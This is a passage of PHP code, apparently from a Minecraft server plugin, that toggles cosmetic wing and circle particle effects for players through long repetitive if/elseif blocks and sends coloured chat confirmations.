				} elseif(in_array($name, $this->particle11)) {
					unset($this->particle11[array_search($name, $this->particle11)]);
				} elseif(in_array($name, $this->particle12)) {
					unset($this->particle12[array_search($name, $this->particle12)]);
				} elseif(in_array($name, $this->particle13)) {
					unset($this->particle13[array_search($name, $this->particle13)]);
				} elseif(in_array($name, $this->particle14)) {
					unset($this->particle14[array_search($name, $this->particle14)]);
				}
				
				
				
			}
			
		}
		
		if($in == TextFormat::RESET . TextFormat::RED . "NEW: " . TextFormat::DARK_GREEN . "Green " . TextFormat::GOLD . "Wing Particles"){
			if(!in_array($name, $this->particle14)) {
				
				$this->particle14[] = $name;
				$player->sendMessage($prefix . TextFormat::GREEN . "You have enabled your " . TextFormat::DARK_GREEN . "Green " . TextFormat::GREEN . "Wing Particles");
				
				if(in_array($name, $this->particle1)) {
					unset($this->particle1[array_search($name, $this->particle1)]);
				} elseif(in_array($name, $this->particle2)) {
					unset($this->particle2[array_search($name, $this->particle2)]);
				} elseif(in_array($name, $this->particle3)) {
					unset($this->particle3[array_search($name, $this->particle3)]);
				} elseif(in_array($name, $this->particle4)) {
					unset($this->particle4[array_search($name, $this->particle4)]);
				} elseif(in_array($name, $this->particle5)) {
					unset($this->particle5[array_search($name, $this->particle5)]);
				} elseif(in_array($name, $this->particle6)) {
					unset($this->particle6[array_search($name, $this->particle6)]);
				} elseif(in_array($name, $this->particle7)) {
					unset($this->particle7[array_search($name, $this->particle7)]);
				} elseif(in_array($name, $this->particle8)) {
					unset($this->particle8[array_search($name, $this->particle8)]);
				} elseif(in_array($name, $this->particle9)) {
					unset($this->particle9[array_search($name, $this->particle9)]);
				} elseif(in_array($name, $this->particle10)) {
					unset($this->particle10[array_search($name, $this->particle10)]);
				} elseif(in_array($name, $this->particle11)) {
					unset($this->particle11[array_search($name, $this->particle11)]);
				} elseif(in_array($name, $this->particle12)) {
					unset($this->particle12[array_search($name, $this->particle12)]);
				} elseif(in_array($name, $this->particle13)) {
					unset($this->particle13[array_search($name, $this->particle13)]);
				} elseif(in_array($name, $this->particle15)) {
					unset($this->particle15[array_search($name, $this->particle15)]);
				}
				
				
				
			} else {
				
				unset($this->particle14[array_search($name, $this->particle14)]);
				
				$player->sendMessage($prefix . TextFormat::RED . "You have disabled your " . TextFormat::DARK_GREEN . "Green " . TextFormat::RED . "Wing Particles");
				
				if(in_array($name, $this->particle1)) {
					unset($this->particle1[array_search($name, $this->particle1)]);
				} elseif(in_array($name, $this->particle2)) {
					unset($this->particle2[array_search($name, $this->particle2)]);
				} elseif(in_array($name, $this->particle3)) {
					unset($this->particle3[array_search($name, $this->particle3)]);
				} elseif(in_array($name, $this->particle4)) {
					unset($this->particle4[array_search($name, $this->particle4)]);
				} elseif(in_array($name, $this->particle5)) {
					unset($this->particle5[array_search($name, $this->particle5)]);
				} elseif(in_array($name, $this->particle6)) {
					unset($this->particle6[array_search($name, $this->particle6)]);
				} elseif(in_array($name, $this->particle7)) {
					unset($this->particle7[array_search($name, $this->particle7)]);
				} elseif(in_array($name, $this->particle8)) {
					unset($this->particle8[array_search($name, $this->particle8)]);
				} elseif(in_array($name, $this->particle9)) {
					unset($this->particle9[array_search($name, $this->particle9)]);
				} elseif(in_array($name, $this->particle10)) {
					unset($this->particle10[array_search($name, $this->particle10)]);
				} elseif(in_array($name, $this->particle11)) {
					unset($this->particle11[array_search($name, $this->particle11)]);
				} elseif(in_array($name, $this->particle12)) {
					unset($this->particle12[array_search($name, $this->particle12)]);
				} elseif(in_array($name, $this->particle13)) {
					unset($this->particle13[array_search($name, $this->particle13)]);
				} elseif(in_array($name, $this->particle15)) {
					unset($this->particle15[array_search($name, $this->particle15)]);
				}
				
				
				
			}
			
		}
		
		if($in == TextFormat::RESET . TextFormat::RED . "NEW: " . TextFormat::RED . "Redstone " . TextFormat::GOLD . "Wing Particles") {
			if(!in_array($name, $this->particle13)) {
				
				$this->particle13[] = $name;
				$player->sendMessage($prefix . TextFormat::GREEN . "You have enabled your " . TextFormat::RED . "Redstone " . TextFormat::GREEN . "Wing Particles");
				
				if(in_array($name, $this->particle1)) {
					unset($this->particle1[array_search($name, $this->particle1)]);
				} elseif(in_array($name, $this->particle2)) {
					unset($this->particle2[array_search($name, $this->particle2)]);
				} elseif(in_array($name, $this->particle3)) {
					unset($this->particle3[array_search($name, $this->particle3)]);
				} elseif(in_array($name, $this->particle4)) {
					unset($this->particle4[array_search($name, $this->particle4)]);
				} elseif(in_array($name, $this->particle5)) {
					unset($this->particle5[array_search($name, $this->particle5)]);
				} elseif(in_array($name, $this->particle6)) {
					unset($this->particle6[array_search($name, $this->particle6)]);
				} elseif(in_array($name, $this->particle7)) {
					unset($this->particle7[array_search($name, $this->particle7)]);
				} elseif(in_array($name, $this->particle8)) {
					unset($this->particle8[array_search($name, $this->particle8)]);
				} elseif(in_array($name, $this->particle9)) {
					unset($this->particle9[array_search($name, $this->particle9)]);
				} elseif(in_array($name, $this->particle10)) {
					unset($this->particle10[array_search($name, $this->particle10)]);
				} elseif(in_array($name, $this->particle11)) {
					unset($this->particle11[array_search($name, $this->particle11)]);
				} elseif(in_array($name, $this->particle12)) {
					unset($this->particle12[array_search($name, $this->particle12)]);
				} elseif(in_array($name, $this->particle14)) {
					unset($this->particle14[array_search($name, $this->particle14)]);
				} elseif(in_array($name, $this->particle15)) {
					unset($this->particle15[array_search($name, $this->particle15)]);
				}
				
				
				
			} else {
				
				unset($this->particle13[array_search($name, $this->particle13)]);
				
				$player->sendMessage($prefix . TextFormat::RED . "You have disabled your " . TextFormat::RED . "Redstone " . TextFormat::RED . "Wing Particles");
				
				if(in_array($name, $this->particle1)) {
					unset($this->particle1[array_search($name, $this->particle1)]);
				} elseif(in_array($name, $this->particle2)) {
					unset($this->particle2[array_search($name, $this->particle2)]);
				} elseif(in_array($name, $this->particle3)) {
					unset($this->particle3[array_search($name, $this->particle3)]);
				} elseif(in_array($name, $this->particle4)) {
					unset($this->particle4[array_search($name, $this->particle4)]);
				} elseif(in_array($name, $this->particle5)) {
					unset($this->particle5[array_search($name, $this->particle5)]);
				} elseif(in_array($name, $this->particle6)) {
					unset($this->particle6[array_search($name, $this->particle6)]);
				} elseif(in_array($name, $this->particle7)) {
					unset($this->particle7[array_search($name, $this->particle7)]);
				} elseif(in_array($name, $this->particle8)) {
					unset($this->particle8[array_search($name, $this->particle8)]);
				} elseif(in_array($name, $this->particle9)) {
					unset($this->particle9[array_search($name, $this->particle9)]);
				} elseif(in_array($name, $this->particle10)) {
					unset($this->particle10[array_search($name, $this->particle10)]);
				} elseif(in_array($name, $this->particle11)) {
					unset($this->particle11[array_search($name, $this->particle11)]);
				} elseif(in_array($name, $this->particle12)) {
					unset($this->particle12[array_search($name, $this->particle12)]);
				} elseif(in_array($name, $this->particle14)) {
					unset($this->particle14[array_search($name, $this->particle14)]);
				} elseif(in_array($name, $this->particle15)) {
					unset($this->particle15[array_search($name, $this->particle15)]);
				}
				
				
				
			}
			
		}
		
		if($in == TextFormat::RESET . TextFormat::RED . "NEW: " . TextFormat::RED . "Fire " . TextFormat::GOLD . "Wing Particles") {
			if(!in_array($name, $this->particle12)) {
				
				$this->particle12[] = $name;
				$player->sendMessage($prefix . TextFormat::GREEN . "You have enabled your " . TextFormat::RED . "Fire " . TextFormat::GREEN . "Wing Particles");
				
				if(in_array($name, $this->particle1)) {
					unset($this->particle1[array_search($name, $this->particle1)]);
				} elseif(in_array($name, $this->particle2)) {
					unset($this->particle2[array_search($name, $this->particle2)]);
				} elseif(in_array($name, $this->particle3)) {
					unset($this->particle3[array_search($name, $this->particle3)]);
				} elseif(in_array($name, $this->particle4)) {
					unset($this->particle4[array_search($name, $this->particle4)]);
				} elseif(in_array($name, $this->particle5)) {
					unset($this->particle5[array_search($name, $this->particle5)]);
				} elseif(in_array($name, $this->particle6)) {
					unset($this->particle6[array_search($name, $this->particle6)]);
				} elseif(in_array($name, $this->particle7)) {
					unset($this->particle7[array_search($name, $this->particle7)]);
				} elseif(in_array($name, $this->particle8)) {
					unset($this->particle8[array_search($name, $this->particle8)]);
				} elseif(in_array($name, $this->particle9)) {
					unset($this->particle9[array_search($name, $this->particle9)]);
				} elseif(in_array($name, $this->particle10)) {
					unset($this->particle10[array_search($name, $this->particle10)]);
				} elseif(in_array($name, $this->particle11)) {
					unset($this->particle11[array_search($name, $this->particle11)]);
				} elseif(in_array($name, $this->particle13)) {
					unset($this->particle13[array_search($name, $this->particle13)]);
				} elseif(in_array($name, $this->particle14)) {
					unset($this->particle14[array_search($name, $this->particle14)]);
				} elseif(in_array($name, $this->particle15)) {
					unset($this->particle15[array_search($name, $this->particle15)]);
				}
				
				
				
			} else {
				
				unset($this->particle12[array_search($name, $this->particle12)]);
				
				$player->sendMessage($prefix . TextFormat::RED . "You have disabled your " . TextFormat::RED . "Fire " . TextFormat::RED . "Wing Particles");
				
				if(in_array($name, $this->particle1)) {
					unset($this->particle1[array_search($name, $this->particle1)]);
				} elseif(in_array($name, $this->particle2)) {
					unset($this->particle2[array_search($name, $this->particle2)]);
				} elseif(in_array($name, $this->particle3)) {
					unset($this->particle3[array_search($name, $this->particle3)]);
				} elseif(in_array($name, $this->particle4)) {
					unset($this->particle4[array_search($name, $this->particle4)]);
				} elseif(in_array($name, $this->particle5)) {
					unset($this->particle5[array_search($name, $this->particle5)]);
				} elseif(in_array($name, $this->particle6)) {
					unset($this->particle6[array_search($name, $this->particle6)]);
				} elseif(in_array($name, $this->particle7)) {
					unset($this->particle7[array_search($name, $this->particle7)]);
				} elseif(in_array($name, $this->particle8)) {
					unset($this->particle8[array_search($name, $this->particle8)]);
				} elseif(in_array($name, $this->particle9)) {
					unset($this->particle9[array_search($name, $this->particle9)]);
				} elseif(in_array($name, $this->particle10)) {
					unset($this->particle10[array_search($name, $this->particle10)]);
				} elseif(in_array($name, $this->particle11)) {
					unset($this->particle11[array_search($name, $this->particle11)]);
				} elseif(in_array($name, $this->particle13)) {
					unset($this->particle13[array_search($name, $this->particle13)]);
				} elseif(in_array($name, $this->particle14)) {
					unset($this->particle14[array_search($name, $this->particle14)]);
				} elseif(in_array($name, $this->particle15)) {
					unset($this->particle15[array_search($name, $this->particle15)]);
				}
				
				
				
			}
			
		}
		
		if($in == TextFormat::RESET . TextFormat::RED . "NEW: " . TextFormat::DARK_RED . "L" . TextFormat::RED . "a" . TextFormat::GOLD . "v" . TextFormat::YELLOW . "a " . TextFormat::GOLD . "Particles") {
			if(!in_array($name, $this->particle11)) {
				
				$this->particle11[] = $name;
				$player->sendMessage($prefix . TextFormat::GREEN . "You have enabled your " . TextFormat::DARK_RED . "L" . TextFormat::RED . "a" . TextFormat::GOLD . "v" . TextFormat::YELLOW . "a" . TextFormat::GREEN . " Particles");
				
				if(in_array($name, $this->particle1)) {
					unset($this->particle1[array_search($name, $this->particle1)]);
				} elseif(in_array($name, $this->particle2)) {
					unset($this->particle2[array_search($name, $this->particle2)]);
				} elseif(in_array($name, $this->particle3)) {
					unset($this->particle3[array_search($name, $this->particle3)]);
				} elseif(in_array($name, $this->particle4)) {
					unset($this->particle4[array_search($name, $this->particle4)]);
				} elseif(in_array($name, $this->particle5)) {
					unset($this->particle5[array_search($name, $this->particle5)]);
				} elseif(in_array($name, $this->particle6)) {
					unset($this->particle6[array_search($name, $this->particle6)]);
				} elseif(in_array($name, $this->particle7)) {
					unset($this->particle7[array_search($name, $this->particle7)]);
				} elseif(in_array($name, $this->particle8)) {
					unset($this->particle8[array_search($name, $this->particle8)]);
				} elseif(in_array($name, $this->particle9)) {
					unset($this->particle9[array_search($name, $this->particle9)]);
				} elseif(in_array($name, $this->particle10)) {
					unset($this->particle10[array_search($name, $this->particle10)]);
				} elseif(in_array($name, $this->particle12)) {
					unset($this->particle12[array_search($name, $this->particle12)]);
				} elseif(in_array($name, $this->particle13)) {
					unset($this->particle13[array_search($name, $this->particle13)]);
				} elseif(in_array($name, $this->particle14)) {
					unset($this->particle14[array_search($name, $this->particle14)]);
				} elseif(in_array($name, $this->particle15)) {
					unset($this->particle15[array_search($name, $this->particle15)]);
				}
				
				
				
			} else {
				
				unset($this->particle11[array_search($name, $this->particle11)]);
				
				$player->sendMessage($prefix . TextFormat::RED . "You have disabled your " . TextFormat::DARK_RED . "L" . TextFormat::RED . "a" . TextFormat::GOLD . "v" . TextFormat::YELLOW . "a" . TextFormat::RED . " Particles");
				
				if(in_array($name, $this->particle1)) {
					unset($this->particle1[array_search($name, $this->particle1)]);
				} elseif(in_array($name, $this->particle2)) {
					unset($this->particle2[array_search($name, $this->particle2)]);
				} elseif(in_array($name, $this->particle3)) {
					unset($this->particle3[array_search($name, $this->particle3)]);
				} elseif(in_array($name, $this->particle4)) {
					unset($this->particle4[array_search($name, $this->particle4)]);
				} elseif(in_array($name, $this->particle5)) {
					unset($this->particle5[array_search($name, $this->particle5)]);
				} elseif(in_array($name, $this->particle6)) {
					unset($this->particle6[array_search($name, $this->particle6)]);
				} elseif(in_array($name, $this->particle7)) {
					unset($this->particle7[array_search($name, $this->particle7)]);
				} elseif(in_array($name, $this->particle8)) {
					unset($this->particle8[array_search($name, $this->particle8)]);
				} elseif(in_array($name, $this->particle9)) {
					unset($this->particle9[array_search($name, $this->particle9)]);
				} elseif(in_array($name, $this->particle10)) {
					unset($this->particle10[array_search($name, $this->particle10)]);
				} elseif(in_array($name, $this->particle12)) {
					unset($this->particle12[array_search($name, $this->particle12)]);
				} elseif(in_array($name, $this->particle13)) {
					unset($this->particle13[array_search($name, $this->particle13)]);
				} elseif(in_array($name, $this->particle14)) {
					unset($this->particle14[array_search($name, $this->particle14)]);
				} elseif(in_array($name, $this->particle15)) {
					unset($this->particle15[array_search($name, $this->particle15)]);
				}
				
				
				
			}
			
		}
		
		if($in == TextFormat::RESET . TextFormat::RED . "Fire " . TextFormat::GOLD . "Circle Particles") {
			
			if(!in_array($name, $this->particle6)) {
				
				$this->particle6[] = $name;
				$player->sendMessage($prefix . TextFormat::GREEN . "You have enabled your " . TextFormat::GOLD . "Fire " . TextFormat::GREEN . "Circle Particles");
				
				if(in_array($name, $this->particle1)) {
					unset($this->particle1[array_search($name, $this->particle1)]);
				} elseif(in_array($name, $this->particle2)) {
					unset($this->particle2[array_search($name, $this->particle2)]);
				} elseif(in_array($name, $this->particle3)) {
					unset($this->particle3[array_search($name, $this->particle3)]);
				} elseif(in_array($name, $this->particle4)) {
					unset($this->particle4[array_search($name, $this->particle4)]);
				} elseif(in_array($name, $this->particle5)) {
					unset($this->particle5[array_search($name, $this->particle5)]);
				} elseif(in_array($name, $this->particle7)) {
					unset($this->particle7[array_search($name, $this->particle7)]);
				} elseif(in_array($name, $this->particle8)) {
					unset($this->particle8[array_search($name, $this->particle8)]);
				} elseif(in_array($name, $this->particle9)) {
					unset($this->particle9[array_search($name, $this->particle9)]);
				} elseif(in_array($name, $this->particle10)) {
					unset($this->particle10[array_search($name, $this->particle10)]);
				} elseif(in_array($name, $this->particle11)) {
					unset($this->particle11[array_search($name, $this->particle11)]);
				} elseif(in_array($name, $this->particle12)) {
					unset($this->particle12[array_search($name, $this->particle12)]);
				} elseif(in_array($name, $this->particle13)) {
					unset($this->particle13[array_search($name, $this->particle13)]);
				} elseif(in_array($name, $this->particle14)) {
					unset($this->particle14[array_search($name, $this->particle14)]);
				} elseif(in_array($name, $this->particle15)) {
					unset($this->particle15[array_search($name, $this->particle15)]);
				}
				
				
				
			} else {
				
				unset($this->particle6[array_search($name, $this->particle6)]);
				
				$player->sendMessage($prefix . TextFormat::RED . "You have disabled your " . TextFormat::GOLD . "Fire " . TextFormat::RED . "Circle Particles");
				
				if(in_array($name, $this->particle1)) {
					unset($this->particle1[array_search($name, $this->particle1)]);
				} elseif(in_array($name, $this->particle2)) {
					unset($this->particle2[array_search($name, $this->particle2)]);
				} elseif(in_array($name, $this->particle3)) {
					unset($this->particle3[array_search($name, $this->particle3)]);
				} elseif(in_array($name, $this->particle4)) {
					unset($this->particle4[array_search($name, $this->particle4)]);
				} elseif(in_array($name, $this->particle5)) {
					unset($this->particle5[array_search($name, $this->particle5)]);
				} elseif(in_array($name, $this->particle7)) {
					unset($this->particle7[array_search($name, $this->particle7)]);
				} elseif(in_array($name, $this->particle8)) {
					unset($this->particle8[array_search($name, $this->particle8)]);
				} elseif(in_array($name, $this->particle9)) {
					unset($this->particle9[array_search($name, $this->particle9)]);
				} elseif(in_array($name, $this->particle10)) {
					unset($this->particle10[array_search($name, $this->particle10)]);
				} elseif(in_array($name, $this->particle11)) {
					unset($this->particle11[array_search($name, $this->particle11)]);
				} elseif(in_array($name, $this->particle12)) {
					unset($this->particle12[array_search($name, $this->particle12)]);
				} elseif(in_array($name, $this->particle13)) {
					unset($this->particle13[array_search($name, $this->particle13)]);
				} elseif(in_array($name, $this->particle14)) {
					unset($this->particle14[array_search($name, $this->particle14)]);
				} elseif(in_array($name, $this->particle15)) {
					unset($this->particle15[array_search($name, $this->particle15)]);
				}
				
				
				
			}
			
		}
		
		if($in == TextFormat::RESET . TextFormat::GOLD . "Orange " . TextFormat::GOLD . "Circle Particles") {
			
			if(!in_array($name, $this->particle5)) {
				
				$this->particle5[] = $name;
				$player->sendMessage($prefix . TextFormat::GREEN . "You have enabled your " . TextFormat::GOLD . "Orange " . TextFormat::GREEN . "Circle Particles");
				
				if(in_array($name, $this->particle1)) {
					unset($this->particle1[array_search($name, $this->particle1)]);
				} elseif(in_array($name, $this->particle2)) {
					unset($this->particle2[array_search($name, $this->particle2)]);
				} elseif(in_array($name, $this->particle3)) {
					unset($this->particle3[array_search($name, $this->particle3)]);
				} elseif(in_array($name, $this->particle4)) {
					unset($this->particle4[array_search($name, $this->particle4)]);
				} elseif(in_array($name, $this->particle6)) {
					unset($this->particle6[array_search($name, $this->particle6)]);
				} elseif(in_array($name, $this->particle7)) {
					unset($this->particle7[array_search($name, $this->particle7)]);
				} elseif(in_array($name, $this->particle8)) {
					unset($this->particle8[array_search($name, $this->particle8)]);
				} elseif(in_array($name, $this->particle9)) {
					unset($this->particle9[array_search($name, $this->particle9)]);
				} elseif(in_array($name, $this->particle10)) {
					unset($this->particle10[array_search($name, $this->particle10)]);
				} elseif(in_array($name, $this->particle11)) {
					unset($this->particle11[array_search($name, $this->particle11)]);
				} elseif(in_array($name, $this->particle12)) {
					unset($this->particle12[array_search($name, $this->particle12)]);
				} elseif(in_array($name, $this->particle13)) {
					unset($this->particle13[array_search($name, $this->particle13)]);
				} elseif(in_array($name, $this->particle14)) {
					unset($this->particle14[array_search($name, $this->particle14)]);
				} elseif(in_array($name, $this->particle15)) {
					unset($this->particle15[array_search($name, $this->particle15)]);
				}
			
			} else {
				
				unset($this->particle5[array_search($name, $this->particle5)]);
				
				$player->sendMessage($prefix . TextFormat::RED . "You have disabled your " . TextFormat::GOLD . "Orange " . TextFormat::RED . "Circle Particles");
				
				if(in_array($name, $this->particle1)) {
					unset($this->particle1[array_search($name, $this->particle1)]);
				} elseif(in_array($name, $this->particle2)) {
					unset($this->particle2[array_search($name, $this->particle2)]);
				} elseif(in_array($name, $this->particle3)) {
					unset($this->particle3[array_search($name, $this->particle3)]);
				} elseif(in_array($name, $this->particle4)) {
					unset($this->particle4[array_search($name, $this->particle4)]);
				} elseif(in_array($name, $this->particle6)) {
					unset($this->particle6[array_search($name, $this->particle6)]);
				} elseif(in_array($name, $this->particle7)) {
					unset($this->particle7[array_search($name, $this->particle7)]);
				} elseif(in_array($name, $this->particle8)) {
					unset($this->particle8[array_search($name, $this->particle8)]);
				} elseif(in_array($name, $this->particle9)) {
					unset($this->particle9[array_search($name, $this->particle9)]);
				} elseif(in_array($name, $this->particle10)) {
					unset($this->particle10[array_search($name, $this->particle10)]);
				} elseif(in_array($name, $this->particle11)) {
					unset($this->particle11[array_search($name, $this->particle11)]);
				} elseif(in_array($name, $this->particle12)) {
					unset($this->particle12[array_search($name, $this->particle12)]);
				} elseif(in_array($name, $this->particle13)) {
					unset($this->particle13[array_search($name, $this->particle13)]);
				} elseif(in_array($name, $this->particle14)) {
					unset($this->particle14[array_search($name, $this->particle14)]);
				} elseif(in_array($name, $this->particle15)) {
					unset($this->particle15[array_search($name, $this->particle15)]);
				}
				
				
				
			}
			
		}
		
		if($in == TextFormat::RESET . TextFormat::RED . "Red " . TextFormat::GOLD . "Circle Particles") {
			
			if(!in_array($name, $this->particle1)) {
				
				$this->particle1[] = $name;
				$player->sendMessage($prefix . TextFormat::GREEN . "You have enabled your " . TextFormat::GOLD . "Red " . TextFormat::GREEN . "Circle Particles");
				
				if(in_array($name, $this->particle2)) {
					unset($this->particle2[array_search($name, $this->particle2)]);
				} elseif(in_array($name, $this->particle3)) {
					unset($this->particle3[array_search($name, $this->particle3)]);
				} elseif(in_array($name, $this->particle4)) {
					unset($this->particle4[array_search($name, $this->particle4)]);
				} elseif(in_array($name, $this->particle5)) {
					unset($this->particle5[array_search($name, $this->particle5)]);
				} elseif(in_array($name, $this->particle6)) {
					unset($this->particle6[array_search($name, $this->particle6)]);
				} elseif(in_array($name, $this->particle7)) {
					unset($this->particle7[array_search($name, $this->particle7)]);
				} elseif(in_array($name, $this->particle8)) {
					unset($this->particle8[array_search($name, $this->particle8)]);
				} elseif(in_array($name, $this->particle9)) {
					unset($this->particle9[array_search($name, $this->particle9)]);
				} elseif(in_array($name, $this->particle10)) {
					unset($this->particle10[array_search($name, $this->particle10)]);
				} elseif(in_array($name, $this->particle11)) {
					unset($this->particle11[array_search($name, $this->particle11)]);
				} elseif(in_array($name, $this->particle12)) {
					unset($this->particle12[array_search($name, $this->particle12)]);
				} elseif(in_array($name, $this->particle13)) {
					unset($this->particle13[array_search($name, $this->particle13)]);
				} elseif(in_array($name, $this->particle14)) {
					unset($this->particle14[array_search($name, $this->particle14)]);
				} elseif(in_array($name, $this->particle15)) {
					unset($this->particle15[array_search($name, $this->particle15)]);
				}
				
				
				
			} else {
				
				unset($this->particle1[array_search($name, $this->particle1)]);
				
				$player->sendMessage($prefix . TextFormat::RED . "You have disabled your " . TextFormat::GOLD . "Red " . TextFormat::RED . "Circle Particles");
				
				if(in_array($name, $this->particle2)) {
					unset($this->particle2[array_search($name, $this->particle2)]);
				} elseif(in_array($name, $this->particle3)) {
					unset($this->particle3[array_search($name, $this->particle3)]);
				} elseif(in_array($name, $this->particle4)) {
					unset($this->particle4[array_search($name, $this->particle4)]);
				} elseif(in_array($name, $this->particle5)) {
					unset($this->particle5[array_search($name, $this->particle5)]);
				} elseif(in_array($name, $this->particle6)) {
					unset($this->particle6[array_search($name, $this->particle6)]);
				} elseif(in_array($name, $this->particle7)) {
					unset($this->particle7[array_search($name, $this->particle7)]);
				} elseif(in_array($name, $this->particle8)) {
					unset($this->particle8[array_search($name, $this->particle8)]);
				} elseif(in_array($name, $this->particle9)) {
					unset($this->particle9[array_search($name, $this->particle9)]);
				} elseif(in_array($name, $this->particle10)) {
					unset($this->particle10[array_search($name, $this->particle10)]);
				} elseif(in_array($name, $this->particle11)) {
					unset($this->particle11[array_search($name, $this->particle11)]);
				} elseif(in_array($name, $this->particle12)) {
					unset($this->particle12[array_search($name, $this->particle12)]);
				} elseif(in_array($name, $this->particle13)) {
					unset($this->particle13[array_search($name, $this->particle13)]);
				} elseif(in_array($name, $this->particle14)) {
					unset($this->particle14[array_search($name, $this->particle14)]);
				} elseif(in_array($name, $this->particle15)) {
					unset($this->particle15[array_search($name, $this->particle15)]);
				}
				
				
				
			}
			
		}
		
		
		if($in == TextFormat::RESET . TextFormat::YELLOW . "Yellow " . TextFormat::GOLD . "Circle Particles") {
			
			if(!in_array($name, $this->particle2)) {
				
				$this->particle2[] = $name;
				$player->sendMessage($prefix . TextFormat::GREEN . "You have enabled your " . TextFormat::GOLD . "Yellow " . TextFormat::GREEN . "Circle Particles");
				
				if(in_array($name, $this->particle1)) {
					unset($this->particle1[array_search($name, $this->particle1)]);
				} elseif(in_array($name, $this->particle3)) {
					unset($this->particle3[array_search($name, $this->particle3)]);
				} elseif(in_array($name, $this->particle4)) {
					unset($this->particle4[array_search($name, $this->particle4)]);
				} elseif(in_array($name, $this->particle5)) {
					unset($this->particle5[array_search($name, $this->particle5)]);
				} elseif(in_array($name, $this->particle6)) {
					unset($this->particle6[array_search($name, $this->particle6)]);
				} elseif(in_array($name, $this->particle7)) {
					unset($this->particle7[array_search($name, $this->particle7)]);
				} elseif(in_array($name, $this->particle8)) {
					unset($this->particle8[array_search($name, $this->particle8)]);
				} elseif(in_array($name, $this->particle9)) {
					unset($this->particle9[array_search($name, $this->particle9)]);
				} elseif(in_array($name, $this->particle10)) {
					unset($this->particle10[array_search($name, $this->particle10)]);
				} elseif(in_array($name, $this->particle11)) {
					unset($this->particle11[array_search($name, $this->particle11)]);
				} elseif(in_array($name, $this->particle12)) {
					unset($this->particle12[array_search($name, $this->particle12)]);
				} elseif(in_array($name, $this->particle13)) {
					unset($this->particle13[array_search($name, $this->particle13)]);
				} elseif(in_array($name, $this->particle14)) {
					unset($this->particle14[array_search($name, $this->particle14)]);
				} elseif(in_array($name, $this->particle15)) {
					unset($this->particle15[array_search($name, $this->particle15)]);
				}
				
				
				
			} else {
				
				unset($this->particle2[array_search($name, $this->particle2)]);
				
				$player->sendMessage($prefix . TextFormat::RED . "You have disabled your " . TextFormat::GOLD . "Yellow " . TextFormat::RED . "Circle Particles");
				
				if(in_array($name, $this->particle1)) {
					unset($this->particle1[array_search($name, $this->particle1)]);
				} elseif(in_array($name, $this->particle3)) {
					unset($this->particle3[array_search($name, $this->particle3)]);
				} elseif(in_array($name, $this->particle4)) {
					unset($this->particle4[array_search($name, $this->particle4)]);
				} elseif(in_array($name, $this->particle5)) {
					unset($this->particle5[array_search($name, $this->particle5)]);
				} elseif(in_array($name, $this->particle6)) {
					unset($this->particle6[array_search($name, $this->particle6)]);
				} elseif(in_array($name, $this->particle7)) {
					unset($this->particle7[array_search($name, $this->particle7)]);
				} elseif(in_array($name, $this->particle8)) {
					unset($this->particle8[array_search($name, $this->particle8)]);
				} elseif(in_array($name, $this->particle9)) {
					unset($this->particle9[array_search($name, $this->particle9)]);
				} elseif(in_array($name, $this->particle10)) {
					unset($this->particle10[array_search($name, $this->particle10)]);
				} elseif(in_array($name, $this->particle11)) {
					unset($this->particle11[array_search($name, $this->particle11)]);
				} elseif(in_array($name, $this->particle12)) {
					unset($this->particle12[array_search($name, $this->particle12)]);
				} elseif(in_array($name, $this->particle13)) {
					unset($this->particle13[array_search($name, $this->particle13)]);
				} elseif(in_array($name, $this->particle14)) {
					unset($this->particle14[array_search($name, $this->particle14)]);
				} elseif(in_array($name, $this->particle15)) {
					unset($this->particle15[array_search($name, $this->particle15)]);
				}
				
				
				
			}
			
		}
		
		if($in == TextFormat::RESET . TextFormat::BLUE . "Blue " . TextFormat::GOLD . "Circle Particles") {
			
			if(!in_array($name, $this->particle4)) {
				
				$this->particle4[] = $name;
				$player->sendMessage($prefix . TextFormat::GREEN . "You have enabled your " . TextFormat::GOLD . "Blue " . TextFormat::GREEN . "Circle Particles");
				
				if(in_array($name, $this->particle1)) {
					unset($this->particle1[array_search($name, $this->particle1)]);
				} elseif(in_array($name, $this->particle2)) {
					unset($this->particle2[array_search($name, $this->particle2)]);
				} elseif(in_array($name, $this->particle3)) {
					unset($this->particle3[array_search($name, $this->particle3)]);
				} elseif(in_array($name, $this->particle5)) {
					unset($this->particle5[array_search($name, $this->particle5)]);
				} elseif(in_array($name, $this->particle6)) {
					unset($this->particle6[array_search($name, $this->particle6)]);
				} elseif(in_array($name, $this->particle7)) {
					unset($this->particle7[array_search($name, $this->particle7)]);
				} elseif(in_array($name, $this->particle8)) {
					unset($this->particle8[array_search($name, $this->particle8)]);
				} elseif(in_array($name, $this->particle9)) {
					unset($this->particle9[array_search($name, $this->particle9)]);
				} elseif(in_array($name, $this->particle10)) {
					unset($this->particle10[array_search($name, $this->particle10)]);
				} elseif(in_array($name, $this->particle11)) {
					unset($this->particle11[array_search($name, $this->particle11)]);
				} elseif(in_array($name, $this->particle12)) {
					unset($this->particle12[array_search($name, $this->particle12)]);
				} elseif(in_array($name, $this->particle13)) {
					unset($this->particle13[array_search($name, $this->particle13)]);
				} elseif(in_array($name, $this->particle14)) {
					unset($this->particle14[array_search($name, $this->particle14)]);
				} elseif(in_array($name, $this->particle15)) {
					unset($this->particle15[array_search($name, $this->particle15)]);
				}
				
				
				
			} else {
				
				unset($this->particle4[array_search($name, $this->particle4)]);
				
				$player->sendMessage($prefix . TextFormat::RED . "You have disabled your " . TextFormat::GOLD . "Blue " . TextFormat::RED . "Circle Particles");
				if(in_array($name, $this->particle1)) {
					unset($this->particle1[array_search($name, $this->particle1)]);
				} elseif(in_array($name, $this->particle2)) {
					unset($this->particle2[array_search($name, $this->particle2)]);
				} elseif(in_array($name, $this->particle3)) {
					unset($this->particle3[array_search($name, $this->particle3)]);
				} elseif(in_array($name, $this->particle5)) {
					unset($this->particle5[array_search($name, $this->particle5)]);
				} elseif(in_array($name, $this->particle6)) {
					unset($this->particle6[array_search($name, $this->particle6)]);
				} elseif(in_array($name, $this->particle7)) {
					unset($this->particle7[array_search($name, $this->particle7)]);
				} elseif(in_array($name, $this->particle8)) {
					unset($this->particle8[array_search($name, $this->particle8)]);
				} elseif(in_array($name, $this->particle9)) {
					unset($this->particle9[array_search($name, $this->particle9)]);
				} elseif(in_array($name, $this->particle10)) {
					unset($this->particle10[array_search($name, $this->particle10)]);
				} elseif(in_array($name, $this->particle11)) {
					unset($this->particle11[array_search($name, $this->particle11)]);
				} elseif(in_array($name, $this->particle12)) {
					unset($this->particle12[array_search($name, $this->particle12)]);
				} elseif(in_array($name, $this->particle13)) {
					unset($this->particle13[array_search($name, $this->particle13)]);
				} elseif(in_array($name, $this->particle14)) {
